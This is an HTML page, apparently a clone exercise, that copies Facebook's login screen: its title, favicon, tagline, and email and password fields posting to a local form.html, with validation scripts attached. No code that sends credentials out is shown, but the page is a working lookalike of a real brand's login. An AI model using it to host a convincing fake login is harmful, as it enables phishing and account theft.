<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook-log in or sign up</title>
    <link rel="stylesheet" href="style.css" type="text/css">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yB/r/2sFJRNmJ5OP.ico">
</head>
<body>
    <div class="container">
        <div class="right-section">
            <img src="image/image.png" alt="">
            <div class="info">
            <h3>Facebook helps you connect and share <br>with the people in your life.</h3>
        </div>
        </div>
        <div class="left-section">
            <div class="box">
                <form action="form.html" id="signup-form">
                    <div class="login-group">
                        <input name="mail" type="text" placeholder="Email address or phone number">
                    </div>
                    <div class="login-group">
                        <input name="pass" type="password" placeholder="Password">
                    </div>
                    <div class="login-btn">
                        <input type="submit" value="Log in">
                    </div>
                    <div class="center-text">
                    <a href="fb.html">Forgotten password?</a>
                    </div>  
                    <hr>
                    <div class="create new account">
                        <button>Create new account</button>
                    </div>
                </form>
            </div>
            <p>
                <a href="fb.html">Create a Page</a> for a celebrity, brand or business.
            </p>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.19.5/dist/jquery.validate.js"></script>
    <script src="script.js"></script>
</body>
</html>
